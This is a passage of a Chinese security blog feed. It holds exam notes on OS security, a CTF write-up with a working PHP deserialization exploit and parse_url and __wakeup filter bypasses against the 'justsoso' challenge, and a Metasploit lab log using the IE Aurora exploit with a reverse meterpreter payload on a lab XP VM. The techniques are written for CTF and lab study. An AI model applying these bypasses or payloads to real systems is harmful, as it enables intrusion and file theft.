id="1-证书颁发机构-CA"><a href="#1-证书颁发机构-CA" class="headerlink" title="1.证书颁发机构(CA)"></a>1.证书颁发机构(CA)</h5><p><img src="https://s2.ax1x.com/2019/05/12/E4knun.png" alt="E4knun.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/E4kG34.png" alt="E4kG34.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/E4kwE6.png" alt="E4kwE6.png"></p><p><img src="https://s2.ax1x.com/2019/05/12/E4Zxm9.png" alt="E4Zxm9.png"></p><h5 id="2-证书注册机构-RA"><a href="#2-证书注册机构-RA" class="headerlink" title="2.证书注册机构(RA)"></a>2.证书注册机构(RA)</h5><p><img src="https://s2.ax1x.com/2019/05/12/E4eDcF.png" alt="E4eDcF.png"></p><h5 id="3-证书库"><a href="#3-证书库" class="headerlink" title="3.证书库"></a>3.证书库</h5><p><img src="https://s2.ax1x.com/2019/05/13/E4MMQK.png" alt="E4MMQK.png"></p><h4 id="证书的使用及验证"><a href="#证书的使用及验证" class="headerlink" title="证书的使用及验证"></a>证书的使用及验证</h4><h2 id="第6章-文件系统安全"><a href="#第6章-文件系统安全" class="headerlink" title="第6章-文件系统安全"></a>第6章-文件系统安全</h2><h3 id="文件系统基础"><a href="#文件系统基础" class="headerlink" title="文件系统基础"></a>文件系统基础</h3><ul><li><p>机器硬盘，固态硬盘。</p></li><li><p>基本分区</p><p>MBR磁盘 ：32位 x86硬盘系统</p><ul><li>引导盘的第一个扇区</li></ul><p>GPT磁盘 ：64位 Itanium处理器</p></li><li><p>DBR:引导扇区，文件系统的第一个扇区、</p></li><li><p>MFT文件记录结构</p><ul><li>每个记录项分为记录头和属性列表两个部分</li><li>记录头里包含了本记录向的总体情况和信息</li><li>属性列表列出了该文件的所有属性</li></ul></li></ul><h3 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h3><p>又称文件夹与文件的访问权限。NTFS分为特殊访问和标准访问权限。特殊权限是最小粒度的权限，标准权限是将某些常用的特殊权限配套组成的六种。</p><ul><li>权限控制的原则<ul><li>权限积累</li><li>以文件夹为权限的设置对象</li><li>拒绝权限优于其他权限</li></ul></li></ul><h3 id="EFS"><a href="#EFS" class="headerlink" title="EFS"></a>EFS</h3><ul><li>基于混合加密机制</li><li>EFS机制</li><li>提供数据恢复功能</li></ul><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><ul><li>文件被考到临时文本文件</li><li>文件被一个随机生成的key加密</li><li>用户公钥对FEK加密，数据解密区生产。</li><li>使用恢复代理的公钥对FEK加密，数去恢复区域产生</li><li>所有内容被写进磁盘</li><li>临时文件删除</li></ul><h3 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h3><ul><li><p>作用</p><p>避免由于磁盘空间使用的失控可能造成的系统崩溃。</p></li><li><p>配额是以文件所有权为基础的，不受位置限制。</p></li><li><p>只适用于卷，且不受卷的文件夹结构以物理磁盘影响。</p></li></ul><h3 id="数据备份的策略，RAID机制的几种备份机制"><a href="#数据备份的策略，RAID机制的几种备份机制" class="headerlink" title="数据备份的策略，RAID机制的几种备份机制"></a>数据备份的策略，RAID机制的几种备份机制</h3><h4 id="完全备份"><a href="#完全备份" class="headerlink" title="完全备份"></a>完全备份</h4><h4 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h4><p>在一次完全备份后对修改的文件备份。不清除标记。</p><h4 id="增量备份"><a href="#增量备份" class="headerlink" title="增量备份"></a>增量备份</h4><p>备份自上一次备份之后有变化的数据。清除标记。</p><h2 id="第7章-身份验证"><a href="#第7章-身份验证" class="headerlink" title="第7章-身份验证"></a>第7章-身份验证</h2><h3 id="针对字典、穷举攻击的防范策略"><a href="#针对字典、穷举攻击的防范策略" class="headerlink" title="针对字典、穷举攻击的防范策略"></a>针对字典、穷举攻击的防范策略</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5u6Z4.png" alt="E5u6Z4.png"></p><h3 id="交互式本地登录组件"><a href="#交互式本地登录组件" class="headerlink" title="交互式本地登录组件"></a>交互式本地登录组件</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5ufRx.png" alt="E5ufRx.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5uoLD.png" alt="E5uoLD.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5u7ee.png" alt="E5u7ee.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5uHdH.png" alt="E5uHdH.png"></p><h3 id="域登录组件"><a href="#域登录组件" class="headerlink" title="域登录组件"></a>域登录组件</h3><h3 id="kerberos协议"><a href="#kerberos协议" class="headerlink" title="kerberos协议"></a>kerberos协议</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5Y9mt.png" alt="E5Y9mt.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E5Yx4U.png" alt="E5Yx4U.png"></p><h3 id="kerberos协议身份验证和票据授予服务"><a href="#kerberos协议身份验证和票据授予服务" class="headerlink" title="kerberos协议身份验证和票据授予服务"></a>kerberos协议身份验证和票据授予服务</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5tsaV.png" alt="E5tsaV.png"></p><p>过程：</p><p><img src="https://s2.ax1x.com/2019/05/13/E5Dec8.png" alt="E5Dec8.png"></p><h3 id="kerberos策略"><a href="#kerberos策略" class="headerlink" title="kerberos策略"></a>kerberos策略</h3><p><img src="https://s2.ax1x.com/2019/05/13/E5DlAs.png" alt="E5DlAs.png"></p><h2 id="第8章-访问控制"><a href="#第8章-访问控制" class="headerlink" title="第8章-访问控制"></a>第8章-访问控制</h2><h3 id="Windows的访问控制模型及组件"><a href="#Windows的访问控制模型及组件" class="headerlink" title="Windows的访问控制模型及组件"></a>Windows的访问控制模型及组件</h3><h4 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h4><p>SRM和OM</p><p><img src="https://s2.ax1x.com/2019/05/13/E52mPH.png" alt="E52mPH.png"></p><p><img src="https://s2.ax1x.com/2019/05/13/E52KxI.png" alt="E52KxI.png"></p><h4 id="自主访问控制（Discretionary-access-control-DAC）"><a href="#自主访问控制（Discretionary-access-control-DAC）" class="headerlink" title="自主访问控制（Discretionary access control:DAC）"></a>自主访问控制（Discretionary access control:DAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5r8VH.png" alt="E5r8VH.png"></p><h4 id="基于角色的访问控制（Role-based-access-control-RBAC）"><a href="#基于角色的访问控制（Role-based-access-control-RBAC）" class="headerlink" title="基于角色的访问控制（Role based access control :RBAC）"></a>基于角色的访问控制（Role based access control :RBAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5yCBF.png" alt="E5yCBF.png"></p><h4 id="强制访问控制（Mandatory-access-control：MAC）"><a href="#强制访问控制（Mandatory-access-control：MAC）" class="headerlink" title="强制访问控制（Mandatory access control：MAC）"></a>强制访问控制（Mandatory access control：MAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5rcin.png" alt="E5rcin.png"></p><h4 id="基于属性的访问控制模型-（ABAC）"><a href="#基于属性的访问控制模型-（ABAC）" class="headerlink" title="基于属性的访问控制模型 （ABAC）"></a>基于属性的访问控制模型 （ABAC）</h4><p><img src="https://s2.ax1x.com/2019/05/13/E5ySXT.png" alt="E5ySXT.png"></p><h3 id="主体和客体的安全描述"><a href="#主体和客体的安全描述" class="headerlink" title="主体和客体的安全描述"></a>主体和客体的安全描述</h3><p>主体：令牌</p><p>客体：安全描述符</p><h3 id="冲突解决方法"><a href="#冲突解决方法" class="headerlink" title="冲突解决方法"></a>冲突解决方法</h3><p>拒绝ACE在允许ACE之前</p><p>直接ACE在继承ACE之前</p><p>从第一层（父对象）继承下来的ACE在其他ACE前面 </p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>大学以来觉得最浪费时间的课之一，希望以后学到内网渗透时会起到作用…</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因考试复习而生的一篇博客…
    
    </summary>
    
      <category term="Study" scheme="https://gardenia30.top/categories/Study/"/>
    
    
      <category term="操作系统安全" scheme="https://gardenia30.top/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2019信息安全国赛部分WP</title>
    <link href="https://gardenia30.top/2019/04/24/2019%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9B%BD%E8%B5%9BWP/"/>
    <id>https://gardenia30.top/2019/04/24/2019信息安全国赛WP/</id>
    <published>2019-04-24T00:28:57.000Z</published>
    <updated>2019-05-23T12:08:36.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>身为萌新，就会一道Web，记录一下，算是纪念吧……<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="justsoso"><a href="#justsoso" class="headerlink" title="justsoso"></a>justsoso</h3><p>这题一开始查看源代码：</p><p><img src="https://s2.ax1x.com/2019/04/20/EPmJjH.png" alt="EPmJjH.png"></p><p>提示读文件，想到文件包含，直接用php://协议读文件</p><p>得到index.php和hint.php</p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>hint.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显是反序列化漏洞，先看index.php，对$file参数的限制注定读取不了flag.php，所以我们包含hint.php来构造反序列化，完成读文件的操作；</p><h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>但是要反序列化必须要先绕过正则判断<code>preg_match(&quot;/flag/&quot;,$value)</code>，一开始天真地以为正则可以直接绕过，所以浪费了很多时间，仔细审计代码，发现是利用parse_url函数进行绕过的一个漏洞：</p><p><strong>本地测试：</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">var_dump($url);</span><br><span class="line">parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line"><span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.不做任何绕过：</p><p><img src="https://s2.ax1x.com/2019/04/20/EPMLQO.png" alt="EPMLQO.png"></p><p>2.在ip后面的路径加上个<code>//</code>，parse_url()会把<code>//</code>认为是相对路径；</p><p><img src="https://s2.ax1x.com/2019/04/20/EPM7Jx.png" alt="EPM7Jx.png"></p><p>3.在ip后面加上<code>///</code>，parse_url会返回false</p><blockquote><p>Note: parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///…）。其它任何协议都不能这样。</p></blockquote><p><img src="https://s2.ax1x.com/2019/04/20/EPQpFI.png" alt="EPQpFI.png"></p><p>这里加上<code>//</code>起不到任何作用，因为query参数没有任何变化，需要构造<code>///</code>，<code>preg_match(&quot;/flag/&quot;,$value)</code></p><p>里的$value即为空值，肯定是可以绕过正则匹配的；</p><h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>到此为止已经可以成功反序列化了，所以需要构造序列化字符串；<del>联想到pop链的构造，但貌似不是，噗哈哈</del></p><p><strong>分析：</strong></p><p>1.有两个不同的类，需要调用的关键方法是Flag类中的getFlag()方法，但是在进行反序列化的时候是不会自动调用的；</p><p>2.Handle类中的__destruct()方法是魔术方法，可以调用Flag类中的getFlag()方法，此时联想到将$handle赋值为Flag类的对象，此时就可以直接从Handle类里直接调用Flag类中的方法；</p><p>3.<code>__wakeup()</code>将在反序列化之后立即被调用，这个<code>__wakeup()</code>函数的作用就是将对象中的参数全部赋空，所以因此需要绕过__wakeup()；</p><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $gardenia1;</span><br><span class="line"><span class="keyword">public</span> $gardenia2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$sky=<span class="keyword">new</span> a();</span><br><span class="line">$sky-&gt;gardenia1=<span class="string">'haha'</span>;</span><br><span class="line">$sky-&gt;gardenia2=<span class="string">'kk'</span>;</span><br><span class="line">var_dump($sky);</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars($sky) <span class="keyword">as</span> $k =&gt; $v) </span><br><span class="line">&#123;</span><br><span class="line">    $sky-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($sky);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><img src="https://s2.ax1x.com/2019/04/20/EP1zTJ.png" alt="EP1zTJ.png"></p><p><strong>bypass技巧：</strong></p><blockquote><p>当序列化字符串当中属性个数值大于实际的属性个数时,就会导致反序列化异常,从而跳过__wakeup函数；</p></blockquote><p>那此时只需要改变反序列化的属性个数即可；</p><h4 id="bypass3"><a href="#bypass3" class="headerlink" title="bypass3"></a>bypass3</h4><p>绕过了上述两个点以后，看getFlag()函数，此时需要<code>$this-&gt;token === $this-&gt;token_flag</code>但是这两个随机值的散列值是很难做到强相等的，所以这就想到一叶飘零学长在安恒1月赛的骚操作，直接用<strong>引用</strong>的方法，使得两个变量指向同一个地址即可(飘零大佬tql)</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$gardenia1=<span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$gardenia1-&gt;token=&amp;$gardenia1-&gt;token_flag;</span><br><span class="line">$gardenia2=<span class="keyword">new</span> Handle($gardenia1);</span><br><span class="line">$res=urlencode(serialize($gardenia2));</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>修改参数个数绕过__wakeup()即可得到flag；</p><p><img src="https://s2.ax1x.com/2019/04/20/EPml4K.png" alt="EPml4K.png"></p><p><strong>参考链接：</strong><a href="http://www.am0s.com/functions/406.html，http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html，http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;身为萌新，就会一道Web，记录一下，算是纪念吧……
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit学习笔记-极光漏洞渗透</title>
    <link href="https://gardenia30.top/2019/04/18/Metasploit%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%85%89%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/"/>
    <id>https://gardenia30.top/2019/04/18/Metasploit学习笔记-极光漏洞渗透/</id>
    <published>2019-04-18T08:37:22.000Z</published>
    <updated>2019-04-23T10:58:27.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Do you konw Aurora?<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>其实就是记录一下一次动手操作的过程；</p><h2 id="主机连通性测试"><a href="#主机连通性测试" class="headerlink" title="主机连通性测试"></a>主机连通性测试</h2><p>1.KALI主机IP为192.168.175.151，配置默认网关为192.168.175.2；</p><p>2.xp主机的IP为192.168.175.158，配置默认网关为192.168.175.2；</p><p>互相可以ping通：</p><p><img src="https://s2.ax1x.com/2019/04/17/Axhz5t.png" alt="Axhz5t.png"></p><p><img src="https://s2.ax1x.com/2019/04/17/AxhXbd.png" alt="AxhXbd.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>因为目标明确，就是利用XP主机的IE浏览器的极光漏洞，编号：ms10-002，所以步骤如下：</p><p>1.加载msf，查找极光漏洞模块；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax5pw9.png" alt="Ax5pw9.png"></p><p>2.利用极光漏洞模块；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax53Sf.png" alt="Ax53Sf.png"></p><p>3.查看模块信息；发现必须要是IE6版本才可以利用此漏洞，所以此次才会选择XP作为靶机；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax5DpV.png" alt="Ax5DpV.png"></p><p>4.查看此次可以利用到的payload，可以看到有许多选项，利用一个即可；</p><p><img src="https://s2.ax1x.com/2019/04/17/Ax5I1K.png" alt="Ax5I1K.png"></p><p>5.选择使用<code>windows/meterpreter/reverse_tcp</code>这个payload，查看详细信息；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxIgv8.png" alt="AxIgv8.png"></p><p>6.payload利用；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxITCq.png" alt="AxITCq.png"></p><p>7.查看此次攻击需要配置的信息；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxIvVJ.png" alt="AxIvVJ.png"></p><p>7.需要设置的是<code>SRVHOST,URIPATH,LHOST</code>，分别对应：KALI主机本身的IP，URL路径，监听主机的IP；设置参数如下：</p><p><img src="https://s2.ax1x.com/2019/04/17/AxobFA.png" alt="AxobFA.png"></p><p>8.exploit；此时本机的4444端口用于监听会话；</p><p><img src="https://s2.ax1x.com/2019/04/17/AxoxOS.png" alt="AxoxOS.png"></p><p>9.在靶机XP中的IE浏览器访问此URL；</p><p><img 